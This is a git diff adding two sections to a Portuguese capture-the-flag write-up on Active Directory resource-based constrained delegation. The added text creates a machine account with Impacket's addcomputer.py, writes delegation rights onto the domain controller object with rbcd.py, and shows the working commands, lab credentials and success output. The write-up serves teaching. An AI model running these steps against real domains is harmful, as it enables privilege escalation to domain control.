@@ -291,3 +291,72 @@ O GUID <code>3f78c3e5-f79a-46bd-a0b8-9d18116ddc79</code> identifica o atributo <
 | **DC01$** | Conta de máquina do Domain Controller |
 
 **Conclusão da enumeração:** <code>r.williams</code> não precisava ser Domain Admin: tinha direito de escrita no atributo preciso que controla a delegação no objeto <code>DC01$</code>.
+
+
+<a id="requisitos"></a>
+
+## 6. Pré-requisitos: por que RBCD seria possível?
+
+Além da permissão <code>AddAllowedToAct</code>, precisava de uma conta de serviço/computador sob controle.
+
+~~~powershell
+Get-ADObject -Identity 'DC=ctf,DC=local' -Properties 'ms-DS-MachineAccountQuota' |
+  Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota'
+~~~
+
+Resultado: <code>10</code>. Essa é a cota padrão para criação de computadores; ainda foi necessário confirmar a criação de fato.
+
+O exemplo <code>New-MachineAccount</code> mostrado pelo BloodHound é do **Powermad** (PowerShell). O <code>addcomputer.py</code> realiza a etapa equivalente pelo Impacket (Linux). Verifique a versão instalada com <code>addcomputer.py -h</code>, não copie parâmetros incompletos de uma página.
+
+<a id="rbcd"></a>
+
+## 7. Conta de computador e configuração RBCD
+
+Na AttackBox:
+
+~~~bash
+addcomputer.py \
+  -dc-ip 10.64.163.15 \
+  -dc-host DC01.ctf.local \
+  -computer-name 'LABPC01$' \
+  -computer-pass 'LabPC2026!Strong' \
+  'ctf.local/r.williams:Helpdesk01!'
+~~~
+
+Retorno: <code>Successfully added machine account LABPC01$</code>.
+
+| Parâmetro | Função |
+|---|---|
+| <code>-computer-name</code> | Nome da conta de máquina criada |
+| <code>-computer-pass</code> | Senha sob nosso controle |
+| <code>-dc-ip</code> / <code>-dc-host</code> | Identificam o DC |
+| <code>domínio/usuário:senha</code> | Conta que solicita a criação |
+
+O <code>$</code> final é típico das contas de máquina.
+
+Para configurar a delegação no objeto <code>DC01$</code>:
+
+~~~bash
+rbcd.py \
+  -dc-ip 10.64.163.15 \
+  -action write \
+  -delegate-from 'LABPC01$' \
+  -delegate-to 'DC01$' \
+  'ctf.local/r.williams:Helpdesk01!'
+~~~
+
+Resultado: <code>Delegation rights modified successfully!</code>.
+
+<code>-delegate-from</code> identifica a conta autorizada a delegar. <code>-delegate-to</code> é o recurso de destino. **A escrita modifica um atributo sensível no AD.**
+
+Conferência:
+
+~~~bash
+rbcd.py \
+  -dc-ip 10.64.163.15 \
+  -action read \
+  -delegate-to 'DC01$' \
+  'ctf.local/r.williams:Helpdesk01!'
+~~~
+
+Resultado: <code>LABPC01$</code> apareceu autorizada no objeto <code>DC01$</code>.
